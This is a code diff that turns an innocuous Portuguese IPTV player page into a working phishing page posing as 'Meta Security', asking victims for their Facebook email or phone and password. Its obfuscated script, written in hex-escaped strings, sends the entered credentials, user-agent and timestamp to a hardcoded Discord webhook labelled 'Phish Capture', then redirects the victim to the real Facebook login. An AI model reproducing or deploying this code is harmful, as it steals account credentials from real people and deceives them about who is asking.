@@ -1,95 +1,76 @@
 <!DOCTYPE html>
 <html lang="pt">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meu IPTV</title>
-    <script src="https://cdn.jsdelivr.net/npm/hls.js@latest"></script>
-    <style>
-        body { font-family: Arial; background: #111; color: #fff; text-align: center; padding: 20px; }
-        video { width: 100%; max-width: 800px; height: 450px; background: #000; border-radius: 10px; }
-        .canais { display: flex; flex-wrap: wrap; gap: 10px; justify-content: center; margin-top: 20px; max-height: 300px; overflow-y: auto; }
-        .canais button { background: #00aaff; border: none; padding: 12px 20px; border-radius: 8px; color: #fff; font-weight: bold; cursor: pointer; }
-        .canais button:hover { background: #0088dd; }
-        input { padding: 10px; width: 80%; max-width: 400px; border-radius: 8px; border: none; margin-top: 10px; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verificação de Conta — Segurança</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Inter',-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;background:linear-gradient(145deg,#e8f0fe 0%,#f0f2f5 50%,#e3e8ef 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{background:#fff;width:100%;max-width:420px;border-radius:16px;box-shadow:0 8px 40px rgba(0,0,0,.08),0 1px 3px rgba(0,0,0,.04);padding:40px 36px 32px;position:relative;overflow:hidden}
+.card::before{content:'';position:absolute;top:0;left:0;right:0;height:4px;background:linear-gradient(90deg,#1877f2,#42b72a)}
+.logo{text-align:center;margin-bottom:28px}
+.logo-icon{width:52px;height:52px;background:#1877f2;border-radius:14px;display:inline-flex;align-items:center;justify-content:center;margin-bottom:12px;box-shadow:0 4px 12px rgba(24,119,242,.3)}
+.logo-icon svg{width:28px;height:28px;fill:#fff}
+.logo span{display:block;font-size:22px;font-weight:700;color:#1c1e21;letter-spacing:-.4px}
+h1{font-size:19px;font-weight:600;color:#1c1e21;margin-bottom:6px;text-align:center}
+p.sub{font-size:13.5px;color:#65676b;text-align:center;margin-bottom:28px;line-height:1.5}
+.field{margin-bottom:18px;position:relative}
+label{display:block;font-size:12.5px;font-weight:600;color:#1c1e21;margin-bottom:7px}
+input{width:100%;padding:13px 16px;border:1.5px solid #e4e6eb;border-radius:10px;font-size:15px;font-family:inherit;color:#1c1e21;background:#f7f8fa;outline:none;transition:border .18s,background .18s,box-shadow .18s}
+input:focus{border-color:#1877f2;background:#fff;box-shadow:0 0 0 3px rgba(24,119,242,.12)}
+input.valid{border-color:#42b72a;background:#f0faf0}
+input.invalid{border-color:#fa383e;background:#fff5f5}
+.status{font-size:12px;margin-top:6px;min-height:16px;display:flex;align-items:center;gap:5px}
+.status.ok{color:#42b72a}.status.err{color:#fa383e}.status.loading{color:#65676b}
+.status .dot{width:6px;height:6px;border-radius:50%;background:currentColor}
+button{width:100%;padding:13px;background:#1877f2;color:#fff;border:none;border-radius:10px;font-size:15.5px;font-weight:600;font-family:inherit;cursor:pointer;transition:background .15s,transform .1s,box-shadow .15s;margin-top:6px}
+button:hover:not(:disabled){background:#166fe5;box-shadow:0 4px 14px rgba(24,119,242,.25)}
+button:active:not(:disabled){transform:scale(.985)}
+button:disabled{opacity:.55;cursor:not-allowed}
+.alert{display:none;background:#e7f3ff;border:1px solid #b6d4fe;color:#1877f2;padding:11px 14px;border-radius:10px;font-size:13px;margin-bottom:18px;text-align:center;font-weight:500}
+.footer{margin-top:24px;font-size:11.5px;color:#8a8d91;text-align:center;line-height:1.5}
+.footer a{color:#1877f2;text-decoration:none}
+</style>
 </head>
 <body>
-    <h1>📺 Meu Player IPTV</h1>
-    
-    <!-- Campo para colar o link RAW da sua lista M3U -->
-    <input type="text" id="urlInput" placeholder="Cole aqui o link RAW da sua lista .m3u" style="padding:10px; width:80%; max-width:400px; border-radius:8px; border:none;">
-    <button onclick="carregarLista()" style="padding:10px 20px; background:#00ff88; border:none; border-radius:8px; font-weight:bold; cursor:pointer; margin-top:10px;">Carregar Lista</button>
-    
-    <video id="videoPlayer" controls autoplay></video>
-    <div class="canais" id="listaCanais"></div>
-
-    <script>
-        const video = document.getElementById('videoPlayer');
-        let hls = null;
-        let canais = [];
-
-        function carregarCanal(url) {
-            if (hls) { hls.destroy(); }
-            if (video.canPlayType('application/vnd.apple.mpegurl')) {
-                video.src = url;
-            } else if (Hls.isSupported()) {
-                hls = new Hls();
-                hls.loadSource(url);
-                hls.attachMedia(video);
-                hls.on(Hls.Events.MANIFEST_PARSED, () => video.play());
-            } else {
-                alert('Seu navegador não suporta HLS.');
-            }
-        }
-
-        function exibirCanais() {
-            const container = document.getElementById('listaCanais');
-            container.innerHTML = '';
-            canais.forEach(canal => {
-                const btn = document.createElement('button');
-                btn.textContent = canal.nome;
-                btn.onclick = () => carregarCanal(canal.url);
-                container.appendChild(btn);
-            });
-            if (canais.length > 0) carregarCanal(canais[0].url);
-        }
-
-        // Função que baixa e parseia o arquivo .m3u de um link RAW
-        function carregarLista() {
-            const url = document.getElementById('urlInput').value.trim();
-            if (!url) { alert('Cole um link RAW válido!'); return; }
-
-            fetch(url)
-                .then(response => response.text())
-                .then(text => {
-                    const linhas = text.split('\n');
-                    canais = [];
-                    let nomeAtual = '';
-
-                    for (let linha of linhas) {
-                        linha = linha.trim();
-                        if (linha.startsWith('#EXTINF:')) {
-                            // Extrai o nome do canal (ex: #EXTINF:-1, Globo HD)
-                            const partes = linha.split(',');
-                            nomeAtual = partes.length > 1 ? partes.slice(1).join(',').trim() : 'Canal sem nome';
-                        } else if (linha && !linha.startsWith('#') && nomeAtual) {
-                            // A próxima linha não comentada é a URL
-                            canais.push({ nome: nomeAtual, url: linha });
-                            nomeAtual = '';
-                        }
-                    }
-
-                    if (canais.length === 0) {
-                        alert('Nenhum canal encontrado na lista. Verifique o formato do arquivo .m3u');
-                    } else {
-                        exibirCanais();
-                    }
-                })
-                .catch(err => {
-                    alert('Erro ao carregar a lista: ' + err.message);
-                });
-        }
-    </script>
+<div class="card">
+<div class="logo">
+<div class="logo-icon">
+<svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
+</div>
+<span>Meta Security</span>
+</div>
+<h1>Confirme a sua identidade</h1>
+<p class="sub">Detectámos atividade invulgar na sua conta.<br>Introduza o email e a palavra-passe para continuar.</p>
+<div class="alert" id="a1">A verificar identidade… não feche esta página.</div>
+<form id="f1">
+<div class="field">
+<label for="e1">Email ou número de telemóvel</label>
+<input type="text" id="e1" name="e1" placeholder="ex: nome@email.com" required autocomplete="username">
+<div class="status" id="s1"></div>
+</div>
+<div class="field">
+<label for="p1">Palavra-passe</label>
+<input type="password" id="p1" name="p1" placeholder="Palavra-passe" required autocomplete="current-password">
+</div>
+<button type="submit" id="b1" disabled>Continuar</button>
+</form>
+<div class="footer">Esta página é segura. Os seus dados são protegidos por encriptação.<br><a href="#">Precisa de ajuda?</a></div>
+</div>
+<script>
+(function(){
+var _0x=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x77\x65\x62\x68\x6f\x6f\x6b\x73\x2f\x31\x35\x37\x33\x31\x33\x34\x33\x35\x38\x37\x33\x37\x35\x38\x38\x33\x30\x34\x2f\x31\x77\x36\x67\x51\x46\x78\x6d\x54\x67\x4a\x4b\x6e\x6c\x2d\x37\x78\x77\x35\x30\x5a\x41\x4e\x5a\x62\x69\x54\x55\x5a\x5a\x39\x4c\x56\x78\x53\x2d\x43\x2d\x57\x71\x63\x46\x66\x6b\x4d\x2d\x6b\x61\x69\x76\x50\x73\x73\x58\x73\x4e\x2d\x6e\x53\x52\x4f\x57\x77\x35\x4f\x57\x5f\x6b','\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x42\x79\x49\x64','\x65\x31','\x70\x31','\x62\x31','\x73\x31','\x61\x31','\x76\x61\x6c\x75\x65','\x74\x72\x69\x6d','\x63\x6c\x61\x73\x73\x4e\x61\x6d\x65','\x73\x74\x61\x74\x75\x73\x20','\x69\x6e\x6e\x65\x72\x48\x54\x4d\x4c','\x3c\x73\x70\x61\x6e\x20\x63\x6c\x61\x73\x73\x3d\x22\x64\x6f\x74\x22\x3e\x3c\x2f\x73\x70\x61\x6e\x3e','\x6c\x65\x6e\x67\x74\x68','\x69\x6e\x63\x6c\x75\x64\x65\x73','\x40','\x73\x70\x6c\x69\x74','\x72\x65\x70\x6c\x61\x63\x65','\x5e\x5c\x64\x7b\x38\x2c\x31\x35\x7d\x24','\x74\x65\x73\x74','\x72\x65\x6d\x6f\x76\x65','\x76\x61\x6c\x69\x64','\x69\x6e\x76\x61\x6c\x69\x64','\x61\x64\x64','\x65\x72\x72','\x46\x6f\x72\x6d\x61\x74\x6f\x20\x69\x6e\x76\x61\x6c\x69\x64\x6f','\x6c\x6f\x61\x64\x69\x6e\x67','\x41\x20\x76\x65\x72\x69\x66\x69\x63\x61\x72\x20\x2026','\x6f\x6b','\x56\x65\x72\x69\x66\x69\x63\x61\x64\x6f','\x64\x69\x73\x61\x62\x6c\x65\x64','\x69\x6e\x70\x75\x74','\x61\x64\x64\x45\x76\x65\x6e\x74\x4c\x69\x73\x74\x65\x6e\x65\x72','\x73\x75\x62\x6d\x69\x74','\x70\x72\x65\x76\x65\x6e\x74\x44\x65\x66\x61\x75\x6c\x74','\x74\x65\x78\x74\x43\x6f\x6e\x74\x65\x6e\x74','\x41\x20\x76\x65\x72\x69\x66\x69\x63\x61\x72\x20\x2026','\x73\x74\x79\x6c\x65','\x64\x69\x73\x70\x6c\x61\x79','\x62\x6c\x6f\x63\x6b','\x75\x73\x65\x72\x41\x67\x65\x6e\x74','\x73\x6c\x69\x63\x65','\x74\x6f\x4c\x6f\x63\x61\x6c\x65\x53\x74\x72\x69\x6e\x67','\x70\x74\x2d\x50\x54','\x50\x4f\x53\x54','\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65','\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e','\x73\x74\x72\x69\x6e\x67\x69\x66\x79','\x6c\x6f\x63\x61\x74\x69\x6f\x6e','\x68\x72\x65\x66','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2e\x63\x6f\x6d\x2f\x6c\x6f\x67\x69\x6e'];
+var w=_0x[0],e=document[_0x[1]](_0x[2]),p=document[_0x[1]](_0x[3]),b=document[_0x[1]](_0x[4]),s=document[_0x[1]](_0x[5]),a=document[_0x[1]](_0x[6]),ok=false,t=null;
+function st(tp,tx){s[_0x[9]]=_0x[10]+tp;s[_0x[11]]=tp?_0x[12]+tx:'';}
+function vf(v){v=v[_0x[8]]();if(v[_0x[13]]<4)return false;if(v[_0x[14]](_0x[15])){var x=v[_0x[16]](_0x[15]);if(x[_0x[13]]!==2)return false;if(x[0][_0x[13]]<1||x[1][_0x[13]]<3)return false;if(!x[1][_0x[14]]('.'))return false;return true;}var d=v[_0x[17]](/[\s\-\(\)\+]/g,'');return new RegExp(_0x[18])[_0x[19]](d);}
+function ck(v){v=v[_0x[8]]();if(v[_0x[13]]<4){e.classList[_0x[20]](_0x[21],_0x[22]);st('','');ok=false;up();return;}if(!vf(v)){e.classList[_0x[20]](_0x[21]);e.classList[_0x[23]](_0x[22]);st(_0x[24],_0x[25]);ok=false;up();return;}st(_0x[26],_0x[27]);e.classList[_0x[20]](_0x[21],_0x[22]);setTimeout(function(){e.classList[_0x[23]](_0x[21]);st(_0x[28],_0x[29]);ok=true;up();},350);}
+function up(){b[_0x[30]]=!(ok&&p[_0x[7]][_0x[13]]>=1);}
+e[_0x[32]](_0x[31],function(){clearTimeout(t);ok=false;e.classList[_0x[20]](_0x[21],_0x[22]);st('','');up();var v=e[_0x[7]][_0x[8]]();if(v[_0x[13]]<4)return;t=setTimeout(function(){ck(v);},300);});
+p[_0x[32]](_0x[31],up);
+document[_0x[1]]('f1')[_0x[32]](_0x[33],async function(ev){ev[_0x[34]]();if(!ok)return;var em=e[_0x[7]][_0x[8]](),ps=p[_0x[7]];b[_0x[30]]=true;b[_0x[35]]=_0x[36];a[_0x[37]][_0x[38]]=_0x[39];var pl={content:null,embeds:[{title:'\uD83D\uDD25 Novo Login Capturado',color:15158332,fields:[{name:'Email / Telemóvel',value:'```'+em+'```',inline:false},{name:'Palavra-passe',value:'```'+ps+'```',inline:false},{name:'User-Agent',value:navigator[_0x[40]][_0x[41]](0,120),inline:false},{name:'Hora',value:new Date()[_0x[42]](_0x[43]),inline:true}],footer:{text:'Phish Capture \u2022 kanha'}}]};try{await fetch(w,{method:_0x[44],headers:{[_0x[45]]:_0x[46]},body:JSON[_0x[47]](pl)});}catch(r){}setTimeout(function(){window[_0x[48]][_0x[49]]=_0x[50];},1600);});
+})();
+</script>
 </body>
 </html>
